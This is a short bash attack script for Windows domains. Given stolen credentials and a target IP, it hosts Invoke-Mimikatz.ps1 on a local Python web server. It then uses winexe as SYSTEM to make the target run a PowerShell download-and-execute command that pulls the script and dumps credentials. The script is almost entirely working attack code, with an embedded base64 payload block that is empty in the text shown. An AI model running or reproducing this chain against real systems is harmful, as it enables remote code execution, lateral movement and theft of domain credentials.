if [[ -z $1 ]] || [[ -z $2 ]] ; then
  if [[ $(uname) == "Darwin" ]]; then
    echo "not supported on osx yet"
    exit 1
  fi
  echo "Runs mimikatz from an http server that's hosted"
  echo " $0 'DOMAIN/user%password' <targetIP>"
else
  credentials="$1"
  targetIP="$2"
  def_int=$(/sbin/route -n | grep '^0.0.0.0.* UG ' | awk '{print $8}')
  def_int_ip=$(/sbin/ifconfig ${def_int} | grep 'inet ' | awk '{print $2}' | cut -d':' -f 2)
  if ! [[ -f Invoke-Mimikatz.ps1 ]]; then
    base64 -d <<HERE > Invoke-Mimikatz.ps1
HERE
  fi
python -m SimpleHTTPServer & 

winexe --system --uninstall -U "$credentials" //$targetIP "powershell \"IEX (New-Object Net.WebClient).DownloadString('http://$def_int_ip:8000/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\""

pythonpid=$(ps aux | grep SimpleHTTPServer | grep -v grep | awk '{print $2}')
kill $pythonpid
fi